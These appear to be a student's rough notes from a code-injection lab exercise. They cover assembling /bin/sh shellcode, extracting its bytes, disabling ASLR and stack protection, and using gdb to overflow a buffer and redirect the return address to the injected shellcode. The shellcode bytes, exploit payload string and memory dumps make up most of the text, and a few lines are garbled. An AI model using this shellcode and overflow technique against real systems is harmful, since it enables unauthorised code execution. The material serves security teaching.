nasm -g -f elf sh.asm 
ld -m elf_i386 -o sh sh.o

for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo

seed@b77a22066539:~/seclabs/codeinjection$ for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80

=> web shell stone laays shell code


==========
local val(64=(27bytes shell code))
ebp
return
agv
--------
sudo sysctl -w kernel.randomize_va_space=0

gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2

sudo ln -sf /bin/zsh /bin/sh

gdb vuln.out -q

break 0x08048441 <+6>:     cmp    DWORD PTR [ebp+0x8],0x1

break 0x0804846b <+48>:    mov    eax,0x0

gdb-peda$ b *0x08048441
Breakpoint 1 at 0x8048441: file vuln.c, line 6.
gdb-peda$ b * 0x0804846b
Breakpoint 2 at 0x804846b: file vuln.c, line 11.

 r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'+'a'*41+'\xff\xff\xff\xff')")
 string length = 27 + 41 + 4
 x/80xb $esp

 gdb-peda$ x/80xb $esp           
0xffffd678:     0x44    0x72    0xfc    0xf7    0xfc    0xe0    0xe2    0xf7
0xffffd680:     0x02    0x00    0x00    0x00    0x07    0x00    0x00    0x00
0xffffd688:     0x60    0x4a    0xe4    0xf7    0xcb    0x84    0x04    0x08
0xffffd690:     0x02    0x00    0x00    0x00    0x54    0xd7    0xff    0xff
0xffffd698:     0x60    0xd7    0xff    0xff    0xa1    0x84    0x04    0x08
0xffffd6a0:     0xdc    0x93    0xfc    0xf7    0x0c    0x82    0x04    0x08
0xffffd6a8:     0x89    0x84    0x04    0x08    0x00    0x00    0x00    0x00
0xffffd6b0:     0x00    0x90    0xfc    0xf7    0x00    0x90    0xfc    0xf7
0xffffd6b8:     0x00    0x00    0x00    0x00    0x47    0xe6    0xe2    0xf7
0xffffd6c0:     0x02    0x00    0x00    0x00    0x54    0xd7    0xff    0xff

In line : 
0xffffd6b8:     0x00    0x00    0x00    0x00    0x47    0xe6    0xe2    0xf7
=> ebp 0x00    0x00    0x00    0x00
=> return address 0x47    0xe6    0xe2    0xf7
c

gdb-peda$ x/80xb $esp
0xffffd678:     0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
0xffffd680:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0xffffd688:     0x53    0x89    0xe1    0x31    0xd2    0x31    0xc0    0xb0
0xffffd690:     0x0b    0xcd    0x80    0x61    0x61    0x61    0x61    0x61
0xffffd698:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffd6a0:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffd6a8:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffd6b0:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffd6b8:     0x61    0x61    0x61    0x61    0xff    0xff    0xff    0xff
0xffffd6c0:     0x00    0x00    0x00    0x00    0x54    0xd7    0xff    0xff

set *address = value
                8       9       A       b
0xffffd6b8:     0x61    0x61    0x61    0x61    0xff    0xff    0xff    0xff => 0xffffd6b8
set *0xffffd6bc=$esp

gdb-peda$ set *0xffffd6bc=$esp
gdb-peda$ x/80xb $esp
0xffffd678:     0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
0xffffd680:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0xffffd688:     0x53    0x89    0xe1    0x31    0xd2    0x31    0xc0    0xb0
0xffffd690:     0x0b    0xcd    0x80    0x61    0x61    0x61    0x61    0x61
0xffffd698:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffd6a0:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffd6a8:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffd6b0:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffd6b8:     0x61    0x61    0x61    0x61    0x78    0xd6    0xff    0xff
0xffffd6c0:     0x00    0x00    0x00    0x00    0x54    0xd7    0xff    0xff

echo -n $(python -c "print('A'*3, end='')") | ./program.out 1


